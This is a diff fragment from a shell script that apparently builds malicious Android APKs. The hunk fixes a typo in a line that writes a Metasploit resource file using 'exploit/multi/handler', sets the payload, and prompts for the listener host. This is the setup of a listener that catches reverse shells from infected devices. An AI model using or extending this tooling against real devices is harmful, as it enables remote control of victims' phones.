@@ -38,7 +38,7 @@ redirect() {
 ### Function to CrateListner ###
 createListner(){
 	touch $apkName.rc
-	echo "use exploit/multi/hnadler" >> $apkName.rc
+	echo "use exploit/multi/handler" >> $apkName.rc
 	echo "set payload $PAYLOAD" >> $apkName.rc
 	echo -n "$GGreen [-]  Do you want to use same lhost for listner(y/n): "; read option1
 	if [ $option1 = "y" ]
